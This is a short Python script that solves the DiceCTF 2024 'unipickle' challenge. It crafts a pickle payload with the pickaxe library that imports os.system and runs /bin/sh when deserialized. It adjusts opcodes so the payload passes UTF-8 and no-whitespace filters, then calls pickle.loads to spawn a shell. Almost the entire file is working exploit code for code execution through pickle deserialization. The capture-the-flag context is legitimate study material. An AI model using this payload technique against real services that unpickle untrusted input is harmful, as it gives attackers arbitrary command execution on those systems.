# challege link: https://github.com/dicegang/dicectf-quals-2024-challenges/tree/main/misc/unipickle


import pickle
import pickaxe


class UnicodeCrafter(pickaxe.Crafter):
    # override this method
    # because pickle.SHORT_BINUNICODE is b'\x8c' and may raises UnicodeDecodeError
    def push_str(self, s):
        data = s.encode("utf-8")
        length = len(data)

        self.add_payload(pickle.SHORT_BINSTRING)
        self._add_number1(length)
        self.add_payload(data)

    def stack_global(self):
        # u"\c293"
        self.put_memo(0xc2)  # no effect to stack
        self.add_payload(pickle.STACK_GLOBAL)


    def import_from(self, module: str, name: str, *, use_stack=True):
        self.push(module)
        self.push(name)
        self.stack_global()


s1 = "os"
s2 = "system"
s3 = "/bin/sh"

crafter = UnicodeCrafter(forbidden_bytes=[b" ", b"\n"])
crafter.import_from(s1, s2)

crafter.mark()
crafter.push(s3)
crafter.call_f(1, use_mark=True)

payload = crafter.get_payload(check_stop=True)

try:
    # check: unicode-safe
    payload_s = payload.decode("utf-8")
    # check: not splitted
    assert len(payload_s.split()) == 1
    # pop a shell
    pickle.loads(payload)
except Exception as ex:
    print("????", payload, ex)
